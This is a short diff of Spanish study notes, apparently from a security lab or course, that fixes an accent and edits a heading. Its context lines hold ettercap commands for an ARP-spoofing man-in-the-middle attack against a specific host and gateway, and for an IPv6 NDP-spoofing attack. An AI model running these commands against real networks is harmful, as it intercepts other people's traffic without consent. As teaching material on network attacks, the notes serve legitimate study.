@@ -65,7 +65,7 @@ Editar en ettercap el valor de remote browser:
 // /etc/etter.conf
 remote_browser = w3m .....
 ```
-Lanzamiento del spofing sobre la maquina con el remote.
+Lanzamiento del spofing sobre la máquina con el remote.
 ```shell
 ettercap -T -i ens33 -P remote_browser -q -M arp:remote //10.11.48.142/ //10.11.48.1/
 ```
@@ -77,7 +77,7 @@ Social:
 - filto ettercap
 - ingeniería social
 
-# H)x
+# H)x B
 MITM ipv6 ettercap + ndp
 ```
 ettercap -T -i 6to4 -Q -M ndp:remote //2002:a0b:308e::1/ //2002:a0b:308e::1/
